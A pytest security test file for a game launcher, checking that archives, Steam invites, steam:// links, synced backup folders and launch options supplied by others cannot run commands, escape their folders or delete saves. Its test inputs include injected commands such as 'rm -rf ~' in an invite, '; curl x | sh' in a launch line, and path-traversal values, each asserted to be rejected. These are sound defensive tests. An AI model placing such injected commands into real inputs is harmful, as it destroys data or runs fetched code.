"""What other people can hand this PC — archives, the synced folder, chat invites, a friend's status — must not be
able to run anything, write outside where it belongs or delete the player's data (security review 2026-10-21)."""

import json
import os
import shutil
import stat
import subprocess
import time
import zipfile

import pytest

from ezgd.installation import archives
from ezgd.library import saves
from ezgd.platform import steambridge, steamfriends


@pytest.mark.skipif(archives.seven_zip() is None, reason="needs 7-Zip")
def test_a_member_named_like_a_switch_stays_a_name(tmp_path):
    """Repairs pass member names to 7-Zip: "-spf" or "@list" must not become switches."""
    src = tmp_path / "src"
    (src / "-spf").mkdir(parents=True)
    (src / "-spf" / "a.txt").write_text("x")
    (src / "ok.txt").write_text("y")
    arc = tmp_path / "game.7z"
    subprocess.run([archives.seven_zip(), "a", "-bso0", str(arc), "--", "-spf", "ok.txt"], cwd=src, check=True)
    dest = tmp_path / "game"
    archives.extract(arc, dest)
    (dest / "-spf" / "a.txt").unlink()
    archives.extract(arc, dest, only={"-spf/a.txt"})                 # the repair path
    assert (dest / "-spf" / "a.txt").read_text() == "x"


def test_invites_only_join_with_a_plain_connect_string():
    ok = steambridge.parse_invite('[gameinvite appid=440 connect="+connect 1.2.3.4:27015"]')
    assert ok and steambridge.allowed_url(steambridge.join_url(ok, "76561198000000001"))
    assert steambridge.parse_invite('[lobbyinvite appid=1145360 lobbyid=109775241]')
    for evil in ('[gameinvite appid=440 connect="+exec autoexec"]', '[gameinvite appid=440 connect="-game /tmp/x"]',
                 '[gameinvite appid=440 connect="1.2.3.4;rm -rf ~"]', '[gameinvite appid=440 connect="-insecure"]',
                 '[gameinvite appid=99999999999 connect=""]'):
        assert steambridge.parse_invite(evil) is None, evil


def test_only_steams_join_chat_and_profile_links_are_opened():
    for url in ("steam://joinlobby/1/2/3", "steam://rungame/440/7656/%2Bconnect%201.2.3.4%3A27015",
                "steam://connect/1.2.3.4:27015?appid=440", "steam://rungameid/440", "steam://friends/message/1",
                "steam://url/SteamIDPage/1"):
        assert steambridge.allowed_url(url), url
    for url in ("steam://run/440//-insecure", "steam://forceinputappid/1", "steam://install/1", "https://x",
                "steam://rungame/440/7656/+exec x", "steam://connect/1.2.3.4:27015?appid=440&x=1"):
        assert not steambridge.allowed_url(url), url
    friend = {"steamid": "7656", "gameid": "440", "lobby": "", "server": "1.2.3.4:27015"}
    assert steamfriends.join_url(friend) == "steam://connect/1.2.3.4:27015?appid=440"
    assert steamfriends.join_url(dict(friend, server="1.2.3.4:27015/../../x")) is None
    assert steamfriends.join_url(dict(friend, lobby="5", steamid="x/y", server="")) is None


def _backup(prefix, folder, title="Game"):
    return saves.backup(prefix, folder, title=title, reason="auto", force=True)


@pytest.fixture
def prefix(tmp_path):
    p = tmp_path / "pfx"
    d = p / "pfx" / "drive_c" / "users" / "steamuser" / "AppData" / "Roaming" / "Game"
    d.mkdir(parents=True)
    (d / "save.dat").write_text("progress")
    return p


def test_fake_backups_in_the_synced_folder_cannot_get_real_ones_deleted(tmp_path, prefix, monkeypatch):
    saves.set_owner("me", tmp_path / "cfg" / "backup-key")
    assert stat.S_IMODE((tmp_path / "cfg" / "backup-key").stat().st_mode) == 0o600
    folder = tmp_path / "Sync" / "EZ Game saves" / "game"
    real = _backup(prefix, folder)
    assert real.mine
    for i in range(30):                                  # far "newer" fakes, even claiming to be from this PC
        with zipfile.ZipFile(folder / f"29990101-00000{i}-auto.zip", "w") as zf:
            zf.writestr(saves.MANIFEST, json.dumps({"reason": "auto", "created": 4e9 + i, "made_by": "me",
                                                    "mac": "0" * 64}))
    saves.prune(folder)
    assert real.path.exists()
    listed = saves.list_backups(folder)
    assert sum(b.mine for b in listed) == 1 and len(listed) == 31
    for _ in range(12):                                  # this PC's own still rotate normally
        time.sleep(0.01)
        (prefix / "pfx" / "drive_c" / "users" / "steamuser" / "AppData" / "Roaming" / "Game" / "save.dat") \
            .write_text(str(time.time()))
        _backup(prefix, folder)
    mine = [b for b in saves.list_backups(folder) if b.mine]
    assert len(mine) == saves.KEEP["auto"] and real.created not in {b.created for b in mine}     # (its name reused)


def test_links_and_bombs_in_the_synced_folder_are_not_followed(tmp_path, prefix):
    saves.set_owner("me", tmp_path / "cfg" / "backup-key")
    folder = tmp_path / "Sync" / "saves"
    folder.mkdir(parents=True)
    victim = tmp_path / "bashrc"
    victim.write_text("mine")
    (folder / "linked.zip").symlink_to(victim)
    b = _backup(prefix, folder)
    assert victim.read_text() == "mine" and b.path.is_file() and not b.path.is_symlink()
    assert [x.path.name for x in saves.list_backups(folder)] == [b.path.name]       # the link is not listed
    with pytest.raises(saves.SaveBackupError, match="link"):
        saves.restore(folder / "linked.zip", prefix)
    bomb = folder / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(saves.MANIFEST, "{}")
        info = zipfile.ZipInfo("steamuser/x.bin")
        zf.writestr(info, b"\0" * 1024)
    with zipfile.ZipFile(bomb) as zf:                     # claims to unpack to more than any save
        assert zf.getinfo("steamuser/x.bin")
    orig = saves.MAX_RESTORE
    try:
        saves.MAX_RESTORE = 512
        with pytest.raises(saves.SaveBackupError, match="far more"):
            saves.restore(bomb, prefix)
    finally:
        saves.MAX_RESTORE = orig


def test_only_this_user_can_talk_to_the_running_app(tmp_path, qapp):
    from ezgd.core import instance
    server = instance.listen(tmp_path, lambda: None)
    try:
        name = server.fullServerName()
        assert stat.S_IMODE(os.stat(name).st_mode) & 0o077 == 0
    finally:
        server.close()


def test_players_cannot_slip_a_shell_into_a_launch_line():
    from ezgd.library import protondb
    assert protondb.sanitize("PROTON_USE_WINED3D=1 %command% ; curl x | sh") is None
    assert shutil.which("sh")
